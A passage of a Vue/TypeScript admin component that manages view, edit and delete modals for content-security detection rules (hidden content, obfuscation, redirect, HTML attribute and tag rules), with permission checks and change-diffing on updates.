  domainModalState.closeModal();
};

// ==========================================
// Modal State: Hidden Content Rule Details (View, Edit, Delete)
// ==========================================
const isHiddenContentDetailsLoading = ref(false);
const selectedHiddenContentRule = ref<HiddenContentRuleDetail | null>(null);
const editingHiddenContentRuleId = ref<number | null>(null);
const isSubmittingHiddenContentEdit = ref(false);
const isDeletingHiddenContentRule = ref(false);
const deletingHiddenContentRule = ref<{ id: number; pattern: string } | null>(null);

const hiddenContentEditForm = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  pattern: '',
  category: 'HIDDEN_CONTENT',
  severity: 'HIGH',
  is_enabled: true,
  description: ''
});

const originalHiddenContentRuleData = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
} | null>(null);

const hiddenContentModalState = useAdminModalState<HiddenContentRuleDetail>({
  getItems: async (id) => {
    if (rulesSubTab.value !== 'hidden_content') return null;
    isHiddenContentDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getHiddenContentRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve hidden content rule details.');
      toastError(msg);
      return null;
    } finally {
      isHiddenContentDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (rulesSubTab.value === 'hidden_content') {
      toastError(`Hidden Content Rule #${id} could not be resolved.`);
      hiddenContentModalState.closeModal({ replace: true });
    }
  }
});

watch(() => hiddenContentModalState.activeEntity.value, (newEntity) => {
  if (newEntity && rulesSubTab.value === 'hidden_content') {
    selectedHiddenContentRule.value = newEntity;

    if (hiddenContentModalState.isEdit.value) {
      if (!canEditHiddenContentRule.value) {
        toastError('You do not have permission to edit hidden content rules.');
        hiddenContentModalState.closeModal({ replace: true });
        return;
      }
      editingHiddenContentRuleId.value = newEntity.id;
      hiddenContentEditForm.value = {
        pattern: newEntity.pattern || '',
        category: newEntity.category || 'HIDDEN_CONTENT',
        severity: newEntity.severity || 'HIGH',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalHiddenContentRuleData.value = {
        pattern: newEntity.pattern || '',
        category: newEntity.category || 'HIDDEN_CONTENT',
        severity: newEntity.severity || 'HIGH',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }

    if (hiddenContentModalState.isDelete.value) {
      if (!canDeleteHiddenContentRule.value) {
        toastError('You do not have permission to delete hidden content rules.');
        hiddenContentModalState.closeModal({ replace: true });
        return;
      }
      if (!deletingHiddenContentRule.value) {
        deletingHiddenContentRule.value = {
          id: newEntity.id,
          pattern: newEntity.pattern || `Rule #${newEntity.id}`
        };
      }
    }
  }
}, { immediate: true });

watch(() => hiddenContentModalState.isView.value, (isView) => {
  if (!isView && !hiddenContentModalState.isEdit.value && !hiddenContentModalState.isDelete.value) {
    selectedHiddenContentRule.value = null;
  }
}, { immediate: true });

watch(() => hiddenContentModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingHiddenContentRuleId.value = null;
    originalHiddenContentRuleData.value = null;
  }
}, { immediate: true });

watch(() => hiddenContentModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingHiddenContentRule.value = null;
  } else if (!canDeleteHiddenContentRule.value) {
    toastError('You do not have permission to delete hidden content rules.');
    hiddenContentModalState.closeModal({ replace: true });
  }
}, { immediate: true });

const openHiddenContentViewModal = (id: number | string) => {
  if (!canViewHiddenContent.value) {
    toastError('You do not have permission to view hidden content rules.');
    return;
  }
  hiddenContentModalState.openView(id);
};

const closeHiddenContentViewModal = () => {
  hiddenContentModalState.closeModal();
};

const openEditHiddenContentRuleModal = async (id: number | string) => {
  if (!canEditHiddenContentRule.value) {
    toastError('You do not have permission to edit hidden content rules.');
    return;
  }
  await hiddenContentModalState.openEdit(id);
};

const closeHiddenContentEditModal = async () => {
  await hiddenContentModalState.closeModal();
};

const openDeleteHiddenContentRuleModal = async (rule: { id: number; pattern?: string }) => {
  if (!canDeleteHiddenContentRule.value) {
    toastError('You do not have permission to delete hidden content rules.');
    return;
  }
  deletingHiddenContentRule.value = {
    id: rule.id,
    pattern: rule.pattern || `Rule #${rule.id}`
  };
  await hiddenContentModalState.openDelete(rule.id);
};

const closeHiddenContentDeleteModal = async () => {
  await hiddenContentModalState.closeModal();
};

const executeDeleteHiddenContentRule = async () => {
  if (!canDeleteHiddenContentRule.value) {
    toastError('You do not have permission to delete hidden content rules.');
    return;
  }

  const targetId = deletingHiddenContentRule.value?.id || hiddenContentModalState.activeId.value;
  if (!targetId) {
    toastError('Hidden content rule identifier missing.');
    return;
  }

  if (isDeletingHiddenContentRule.value) return;

  isDeletingHiddenContentRule.value = true;
  try {
    await contentSecurityService.deleteHiddenContentRule(targetId);
    toastSuccess(`Hidden content rule "${deletingHiddenContentRule.value?.pattern || `#${targetId}`}" deleted successfully.`);
    await closeHiddenContentDeleteModal();
    await fetchHiddenContentRules();
    await fetchDetectionRulesSummary();

    if (hiddenContentRulesData.value.length === 0 && hiddenContentPage.value > 1) {
      hiddenContentPage.value = Math.max(1, hiddenContentPage.value - 1);
      await fetchHiddenContentRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete hidden content rule.');
    toastError(msg);
  } finally {
    isDeletingHiddenContentRule.value = false;
  }
};

const submitUpdateHiddenContentRule = async () => {
  if (!canEditHiddenContentRule.value) {
    toastError('You do not have permission to edit hidden content rules.');
    return;
  }

  if (!editingHiddenContentRuleId.value) {
    toastError('Hidden content rule identifier missing.');
    return;
  }

  const trimmedPattern = hiddenContentEditForm.value.pattern.trim();
  if (!trimmedPattern) {
    toastError('CSS pattern / declaration is required.');
    return;
  }

  const payload: UpdateHiddenContentRulePayload = {};
  const orig = originalHiddenContentRuleData.value;
  const current = hiddenContentEditForm.value;

  if (orig) {
    if (trimmedPattern !== orig.pattern.trim()) {
      payload.pattern = trimmedPattern;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.pattern = trimmedPattern;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeHiddenContentEditModal();
    return;
  }

  if (isSubmittingHiddenContentEdit.value) return;

  isSubmittingHiddenContentEdit.value = true;
  try {
    const updated = await contentSecurityService.updateHiddenContentRule(editingHiddenContentRuleId.value, payload);
    toastSuccess('Hidden content rule updated successfully.');
    await closeHiddenContentEditModal();
    await fetchHiddenContentRules();
    await fetchDetectionRulesSummary();

    if (selectedHiddenContentRule.value && String(selectedHiddenContentRule.value.id) === String(updated.id)) {
      selectedHiddenContentRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update hidden content rule.');
    toastError(msg);
  } finally {
    isSubmittingHiddenContentEdit.value = false;
  }
};

// ==========================================
// Modal State: Obfuscation Rule Details (View), Edit & Delete
// ==========================================
const isObfuscationDetailsLoading = ref(false);
const selectedObfuscationRule = ref<ObfuscationRuleDetail | null>(null);
const editingObfuscationRuleId = ref<number | null>(null);
const isSubmittingObfuscationEdit = ref(false);
const isDeletingObfuscationRule = ref(false);
const deletingObfuscationRule = ref<{ id: number; pattern?: string } | null>(null);

const obfuscationEditForm = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  pattern: '',
  category: 'OBFUSCATION',
  severity: 'HIGH',
  is_enabled: true,
  description: ''
});

const originalObfuscationRuleData = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
} | null>(null);

const obfuscationModalState = useAdminModalState<ObfuscationRuleDetail>({
  getItems: async (id) => {
    if (rulesSubTab.value !== 'obfuscation') return null;
    isObfuscationDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getObfuscationRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve obfuscation rule details.');
      toastError(msg);
      return null;
    } finally {
      isObfuscationDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (rulesSubTab.value === 'obfuscation') {
      toastError(`Obfuscation Rule #${id} could not be resolved.`);
      obfuscationModalState.closeModal({ replace: true });
    }
  }
});

watch(() => obfuscationModalState.activeEntity.value, (newEntity) => {
  if (newEntity && rulesSubTab.value === 'obfuscation') {
    selectedObfuscationRule.value = newEntity;

    if (obfuscationModalState.isEdit.value) {
      if (!canEditObfuscationRule.value) {
        toastError('You do not have permission to edit obfuscation rules.');
        obfuscationModalState.closeModal({ replace: true });
        return;
      }
      editingObfuscationRuleId.value = newEntity.id;
      obfuscationEditForm.value = {
        pattern: newEntity.pattern || '',
        category: newEntity.category || 'OBFUSCATION',
        severity: newEntity.severity || 'HIGH',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalObfuscationRuleData.value = {
        pattern: newEntity.pattern || '',
        category: newEntity.category || 'OBFUSCATION',
        severity: newEntity.severity || 'HIGH',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }

    if (obfuscationModalState.isDelete.value) {
      if (!canDeleteObfuscationRule.value) {
        toastError('You do not have permission to delete obfuscation rules.');
        obfuscationModalState.closeModal({ replace: true });
        return;
      }
      if (!deletingObfuscationRule.value) {
        deletingObfuscationRule.value = {
          id: newEntity.id,
          pattern: newEntity.pattern || `Rule #${newEntity.id}`
        };
      }
    }
  }
}, { immediate: true });

watch(() => obfuscationModalState.isView.value, (isView) => {
  if (!isView && !obfuscationModalState.isEdit.value && !obfuscationModalState.isDelete.value) {
    selectedObfuscationRule.value = null;
  }
}, { immediate: true });

watch(() => obfuscationModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingObfuscationRuleId.value = null;
    originalObfuscationRuleData.value = null;
  }
}, { immediate: true });

watch(() => obfuscationModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingObfuscationRule.value = null;
  } else if (!canDeleteObfuscationRule.value) {
    toastError('You do not have permission to delete obfuscation rules.');
    obfuscationModalState.closeModal({ replace: true });
  }
}, { immediate: true });

const openObfuscationViewModal = (id: number | string) => {
  if (!canViewObfuscation.value) {
    toastError('You do not have permission to view obfuscation rules.');
    return;
  }
  obfuscationModalState.openView(id);
};

const closeObfuscationViewModal = () => {
  obfuscationModalState.closeModal();
};

const openEditObfuscationRuleModal = async (id: number | string) => {
  if (!canEditObfuscationRule.value) {
    toastError('You do not have permission to edit obfuscation rules.');
    return;
  }
  await obfuscationModalState.openEdit(id);
};

const closeObfuscationEditModal = async () => {
  await obfuscationModalState.closeModal();
};

const submitUpdateObfuscationRule = async () => {
  if (!canEditObfuscationRule.value) {
    toastError('You do not have permission to edit obfuscation rules.');
    return;
  }

  if (!editingObfuscationRuleId.value) {
    toastError('Obfuscation rule identifier missing.');
    return;
  }

  const trimmedPattern = obfuscationEditForm.value.pattern.trim();
  if (!trimmedPattern) {
    toastError('Pattern / regex is required.');
    return;
  }

  const payload: UpdateObfuscationRulePayload = {};
  const orig = originalObfuscationRuleData.value;
  const current = obfuscationEditForm.value;

  if (orig) {
    if (trimmedPattern !== orig.pattern.trim()) {
      payload.pattern = trimmedPattern;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.pattern = trimmedPattern;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeObfuscationEditModal();
    return;
  }

  if (isSubmittingObfuscationEdit.value) return;

  isSubmittingObfuscationEdit.value = true;
  try {
    const updated = await contentSecurityService.updateObfuscationRule(editingObfuscationRuleId.value, payload);
    toastSuccess('Obfuscation rule updated successfully.');
    await closeObfuscationEditModal();
    await fetchObfuscationRules();
    await fetchDetectionRulesSummary();

    if (selectedObfuscationRule.value && String(selectedObfuscationRule.value.id) === String(updated.id)) {
      selectedObfuscationRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update obfuscation rule.');
    toastError(msg);
  } finally {
    isSubmittingObfuscationEdit.value = false;
  }
};

const openDeleteObfuscationRuleModal = async (rule: { id: number; pattern?: string }) => {
  if (!canDeleteObfuscationRule.value) {
    toastError('You do not have permission to delete obfuscation rules.');
    return;
  }
  deletingObfuscationRule.value = {
    id: rule.id,
    pattern: rule.pattern || `Rule #${rule.id}`
  };
  await obfuscationModalState.openDelete(rule.id);
};

const closeObfuscationDeleteModal = async () => {
  await obfuscationModalState.closeModal();
};

const executeDeleteObfuscationRule = async () => {
  if (!canDeleteObfuscationRule.value) {
    toastError('You do not have permission to delete obfuscation rules.');
    return;
  }

  const targetId = deletingObfuscationRule.value?.id || obfuscationModalState.activeId.value;
  if (!targetId) {
    toastError('Obfuscation rule identifier missing.');
    return;
  }

  if (isDeletingObfuscationRule.value) return;

  isDeletingObfuscationRule.value = true;
  try {
    await contentSecurityService.deleteObfuscationRule(targetId);
    toastSuccess(`Obfuscation rule "${deletingObfuscationRule.value?.pattern || `#${targetId}`}" deleted successfully.`);
    await closeObfuscationDeleteModal();
    await fetchObfuscationRules();
    await fetchDetectionRulesSummary();

    if (obfuscationRulesData.value.length === 0 && obfuscationPage.value > 1) {
      obfuscationPage.value = Math.max(1, obfuscationPage.value - 1);
      await fetchObfuscationRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete obfuscation rule.');
    toastError(msg);
  } finally {
    isDeletingObfuscationRule.value = false;
  }
};

// Redirect Rule Details & Edit Modal State
const isRedirectDetailsLoading = ref(false);
const selectedRedirectRule = ref<RedirectRuleDetail | null>(null);

const editingRedirectRuleId = ref<number | string | null>(null);
const isSubmittingRedirectEdit = ref(false);

const deletingRedirectRule = ref<{ id: number | string; pattern: string } | null>(null);
const isDeletingRedirectRule = ref(false);

const redirectEditForm = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  pattern: '',
  category: 'REDIRECT',
  severity: 'HIGH',
  is_enabled: true,
  description: ''
});

const originalRedirectRuleData = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
} | null>(null);

const redirectModalState = useAdminModalState<RedirectRuleDetail>({
  getItems: async (id) => {
    if (rulesSubTab.value !== 'redirects') return null;
    isRedirectDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getRedirectRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve redirect rule details.');
      toastError(msg);
      return null;
    } finally {
      isRedirectDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (rulesSubTab.value === 'redirects') {
      toastError(`Redirect Rule #${id} could not be resolved.`);
      redirectModalState.closeModal({ replace: true });
    }
  }
});

watch(() => redirectModalState.activeEntity.value, (newEntity) => {
  if (newEntity && rulesSubTab.value === 'redirects') {
    selectedRedirectRule.value = newEntity;

    if (redirectModalState.isEdit.value) {
      if (!canEditRedirectRule.value) {
        toastError('You do not have permission to edit redirect rules.');
        redirectModalState.closeModal({ replace: true });
        return;
      }
      editingRedirectRuleId.value = newEntity.id;
      redirectEditForm.value = {
        pattern: newEntity.pattern || '',
        category: newEntity.category || 'REDIRECT',
        severity: newEntity.severity || 'HIGH',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalRedirectRuleData.value = {
        pattern: newEntity.pattern || '',
        category: newEntity.category || 'REDIRECT',
        severity: newEntity.severity || 'HIGH',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }

    if (redirectModalState.isDelete.value) {
      if (!canDeleteRedirectRule.value) {
        toastError('You do not have permission to delete redirect rules.');
        redirectModalState.closeModal({ replace: true });
        return;
      }
      if (!deletingRedirectRule.value) {
        deletingRedirectRule.value = {
          id: newEntity.id,
          pattern: newEntity.pattern || `Rule #${newEntity.id}`
        };
      }
    }
  }
}, { immediate: true });

watch(() => redirectModalState.isView.value, (isView) => {
  if (!isView && !redirectModalState.isEdit.value && !redirectModalState.isDelete.value) {
    selectedRedirectRule.value = null;
  }
}, { immediate: true });

watch(() => redirectModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingRedirectRuleId.value = null;
    originalRedirectRuleData.value = null;
  }
}, { immediate: true });

watch(() => redirectModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingRedirectRule.value = null;
  } else if (!canDeleteRedirectRule.value) {
    toastError('You do not have permission to delete redirect rules.');
    redirectModalState.closeModal({ replace: true });
  }
}, { immediate: true });

const openRedirectViewModal = (id: number | string) => {
  if (!canViewRedirects.value) {
    toastError('You do not have permission to view redirect rules.');
    return;
  }
  redirectModalState.openView(id);
};

const closeRedirectViewModal = () => {
  redirectModalState.closeModal();
};

const openEditRedirectRuleModal = async (id: number | string) => {
  if (!canEditRedirectRule.value) {
    toastError('You do not have permission to edit redirect rules.');
    return;
  }
  await redirectModalState.openEdit(id);
};

const closeRedirectEditModal = async () => {
  await redirectModalState.closeModal();
};

const submitUpdateRedirectRule = async () => {
  if (!canEditRedirectRule.value) {
    toastError('You do not have permission to edit redirect rules.');
    return;
  }

  if (!editingRedirectRuleId.value) {
    toastError('Redirect rule identifier missing.');
    return;
  }

  const trimmedPattern = redirectEditForm.value.pattern.trim();
  if (!trimmedPattern) {
    toastError('Pattern / heuristic sequence is required.');
    return;
  }

  const payload: UpdateRedirectRulePayload = {};
  const orig = originalRedirectRuleData.value;
  const current = redirectEditForm.value;

  if (orig) {
    if (trimmedPattern !== orig.pattern.trim()) {
      payload.pattern = trimmedPattern;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.pattern = trimmedPattern;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeRedirectEditModal();
    return;
  }

  if (isSubmittingRedirectEdit.value) return;

  isSubmittingRedirectEdit.value = true;
  try {
    const updated = await contentSecurityService.updateRedirectRule(editingRedirectRuleId.value, payload);
    toastSuccess('Redirect rule updated successfully.');
    await closeRedirectEditModal();
    await fetchRedirectRules();
    await fetchDetectionRulesSummary();

    if (selectedRedirectRule.value && String(selectedRedirectRule.value.id) === String(updated.id)) {
      selectedRedirectRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update redirect rule.');
    toastError(msg);
  } finally {
    isSubmittingRedirectEdit.value = false;
  }
};

const openDeleteRedirectRuleModal = async (rule: { id: number | string; pattern?: string }) => {
  if (!canDeleteRedirectRule.value) {
    toastError('You do not have permission to delete redirect rules.');
    return;
  }
  deletingRedirectRule.value = {
    id: rule.id,
    pattern: rule.pattern || `Rule #${rule.id}`
  };
  await redirectModalState.openDelete(rule.id);
};

const closeRedirectDeleteModal = async () => {
  await redirectModalState.closeModal();
};

const executeDeleteRedirectRule = async () => {
  if (!canDeleteRedirectRule.value) {
    toastError('You do not have permission to delete redirect rules.');
    return;
  }

  const targetId = deletingRedirectRule.value?.id || redirectModalState.activeId.value;
  if (!targetId) {
    toastError('Redirect rule identifier missing.');
    return;
  }

  if (isDeletingRedirectRule.value) return;

  isDeletingRedirectRule.value = true;
  try {
    await contentSecurityService.deleteRedirectRule(targetId);
    toastSuccess(`Redirect rule "${deletingRedirectRule.value?.pattern || `#${targetId}`}" deleted successfully.`);
    await closeRedirectDeleteModal();
    await fetchRedirectRules();
    await fetchDetectionRulesSummary();

    if (redirectRulesData.value.length === 0 && redirectPage.value > 1) {
      redirectPage.value = Math.max(1, redirectPage.value - 1);
      await fetchRedirectRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete redirect rule.');
    toastError(msg);
  } finally {
    isDeletingRedirectRule.value = false;
  }
};

// HTML Attribute Rule Details & Edit Modal State
const isHtmlAttributeDetailsLoading = ref(false);
const selectedHtmlAttributeRule = ref<HtmlAttributeRuleDetail | null>(null);
const editingHtmlAttributeRuleId = ref<number | string | null>(null);
const isSubmittingHtmlAttributeEdit = ref(false);
const deletingHtmlAttributeRule = ref<{ id: number | string; attribute: string } | null>(null);
const isDeletingHtmlAttributeRule = ref(false);

const htmlAttributeEditForm = ref<{
  attribute: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  attribute: '',
  category: 'INJECTION',
  severity: 'CRITICAL',
  is_enabled: true,
  description: ''
});

const originalHtmlAttributeRuleData = ref<{
  attribute: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
} | null>(null);

const htmlAttributeModalState = useAdminModalState<HtmlAttributeRuleDetail>({
  getItems: async (id) => {
    if (rulesSubTab.value !== 'attributes') return null;
    isHtmlAttributeDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getHtmlAttributeRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve HTML attribute rule details.');
      toastError(msg);
      return null;
    } finally {
      isHtmlAttributeDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (rulesSubTab.value === 'attributes') {
      toastError(`HTML Attribute Rule #${id} could not be resolved.`);
      htmlAttributeModalState.closeModal({ replace: true });
    }
  }
});

watch(() => htmlAttributeModalState.activeEntity.value, (newEntity) => {
  if (newEntity && rulesSubTab.value === 'attributes') {
    selectedHtmlAttributeRule.value = newEntity;
    if (htmlAttributeModalState.isEdit.value) {
      if (!canEditHtmlAttributeRule.value) {
        toastError('You do not have permission to edit HTML attribute rules.');
        htmlAttributeModalState.closeModal({ replace: true });
        return;
      }
      editingHtmlAttributeRuleId.value = newEntity.id;
      htmlAttributeEditForm.value = {
        attribute: newEntity.attribute || newEntity.pattern || '',
        category: newEntity.category || 'INJECTION',
        severity: newEntity.severity || 'CRITICAL',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalHtmlAttributeRuleData.value = {
        attribute: newEntity.attribute || newEntity.pattern || '',
        category: newEntity.category || 'INJECTION',
        severity: newEntity.severity || 'CRITICAL',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }
    if (htmlAttributeModalState.isDelete.value) {
      if (!canDeleteHtmlAttributeRule.value) {
        toastError('You do not have permission to delete HTML attribute rules.');
        htmlAttributeModalState.closeModal({ replace: true });
        return;
      }
      deletingHtmlAttributeRule.value = {
        id: newEntity.id,
        attribute: newEntity.attribute || newEntity.pattern || ''
      };
    }
  }
}, { immediate: true });

watch(() => htmlAttributeModalState.isView.value, (isView) => {
  if (!isView && !htmlAttributeModalState.isEdit.value) {
    selectedHtmlAttributeRule.value = null;
  }
}, { immediate: true });

watch(() => htmlAttributeModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingHtmlAttributeRuleId.value = null;
    originalHtmlAttributeRuleData.value = null;
  }
}, { immediate: true });

watch(() => htmlAttributeModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingHtmlAttributeRule.value = null;
  }
}, { immediate: true });

const openHtmlAttributeViewModal = (id: number | string) => {
  if (!canViewHtmlAttributeRules.value) {
    toastError('You do not have permission to view HTML attribute rules.');
    return;
  }
  htmlAttributeModalState.openView(id);
};

const closeHtmlAttributeViewModal = () => {
  htmlAttributeModalState.closeModal();
};

const openEditHtmlAttributeRuleModal = async (id: number | string) => {
  if (!canEditHtmlAttributeRule.value) {
    toastError('You do not have permission to edit HTML attribute rules.');
    return;
  }
  await htmlAttributeModalState.openEdit(id);
};

const closeHtmlAttributeEditModal = async () => {
  await htmlAttributeModalState.closeModal();
};

const submitUpdateHtmlAttributeRule = async () => {
  if (!canEditHtmlAttributeRule.value) {
    toastError('You do not have permission to edit HTML attribute rules.');
    return;
  }
  if (!editingHtmlAttributeRuleId.value) {
    toastError('HTML attribute rule identifier missing.');
    return;
  }
  const trimmedAttribute = htmlAttributeEditForm.value.attribute.trim();
  if (!trimmedAttribute) {
    toastError('Attribute / pattern is required.');
    return;
  }

  const payload: UpdateHtmlAttributeRulePayload = {};
  const orig = originalHtmlAttributeRuleData.value;
  const current = htmlAttributeEditForm.value;

  if (orig) {
    if (trimmedAttribute !== orig.attribute.trim()) {
      payload.attribute = trimmedAttribute;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.attribute = trimmedAttribute;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeHtmlAttributeEditModal();
    return;
  }

  if (isSubmittingHtmlAttributeEdit.value) return;
  isSubmittingHtmlAttributeEdit.value = true;

  try {
    const updated = await contentSecurityService.updateHtmlAttributeRule(editingHtmlAttributeRuleId.value, payload);
    toastSuccess('HTML attribute rule updated successfully.');
    await closeHtmlAttributeEditModal();
    await fetchHtmlAttributeRules();
    await fetchDetectionRulesSummary();
    if (selectedHtmlAttributeRule.value && String(selectedHtmlAttributeRule.value.id) === String(updated.id)) {
      selectedHtmlAttributeRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update HTML attribute rule.');
    toastError(msg);
  } finally {
    isSubmittingHtmlAttributeEdit.value = false;
  }
};

const openDeleteHtmlAttributeRuleModal = async (rule: { id: number | string; attribute?: string; pattern?: string }) => {
  if (!canDeleteHtmlAttributeRule.value) {
    toastError('You do not have permission to delete HTML attribute rules.');
    return;
  }
  deletingHtmlAttributeRule.value = {
    id: rule.id,
    attribute: rule.attribute || rule.pattern || `Rule #${rule.id}`
  };
  await htmlAttributeModalState.openDelete(rule.id);
};

const closeHtmlAttributeDeleteModal = async () => {
  await htmlAttributeModalState.closeModal();
};

const executeDeleteHtmlAttributeRule = async () => {
  if (!canDeleteHtmlAttributeRule.value) {
    toastError('You do not have permission to delete HTML attribute rules.');
    return;
  }
  const targetId = deletingHtmlAttributeRule.value?.id || htmlAttributeModalState.activeId.value;
  if (!targetId) {
    toastError('HTML attribute rule identifier missing.');
    return;
  }
  if (isDeletingHtmlAttributeRule.value) return;
  isDeletingHtmlAttributeRule.value = true;
  try {
    await contentSecurityService.deleteHtmlAttributeRule(targetId);
    toastSuccess(`HTML attribute rule "${deletingHtmlAttributeRule.value?.attribute || `#${targetId}`}" deleted successfully.`);
    await closeHtmlAttributeDeleteModal();
    await fetchHtmlAttributeRules();
    await fetchDetectionRulesSummary();

    if (htmlAttributeRulesData.value.length === 0 && htmlAttributePage.value > 1) {
      htmlAttributePage.value = Math.max(1, htmlAttributePage.value - 1);
      await fetchHtmlAttributeRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete HTML attribute rule.');
    toastError(msg);
  } finally {
    isDeletingHtmlAttributeRule.value = false;
  }
};

// HTML Tag Rule Details & Edit & Delete Modal State
const isHtmlTagDetailsLoading = ref(false);
const selectedHtmlTagRule = ref<HtmlTagRuleDetail | null>(null);

// HTML Tag Rule Delete Modal State
const deletingHtmlTagRule = ref<{ id: number | string; tag: string } | null>(null);
const isDeletingHtmlTagRule = ref(false);

// HTML Tag Rule Edit Modal State
const editingHtmlTagRuleId = ref<number | string | null>(null);
const isSubmittingHtmlTagEdit = ref(false);

const htmlTagEditForm = ref<{
  tag: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  tag: '',
  category: 'DANGEROUS_TAGS',
  severity: 'CRITICAL',
  is_enabled: true,
  description: ''
});

const originalHtmlTagRuleData = ref<{
  tag: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
} | null>(null);

const htmlTagModalState = useAdminModalState<HtmlTagRuleDetail>({
  getItems: async (id) => {
    if (rulesSubTab.value !== 'html') return null;
    isHtmlTagDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getHtmlTagRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve HTML tag rule details.');
      toastError(msg);
      return null;
    } finally {
      isHtmlTagDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    if (rulesSubTab.value === 'html') {
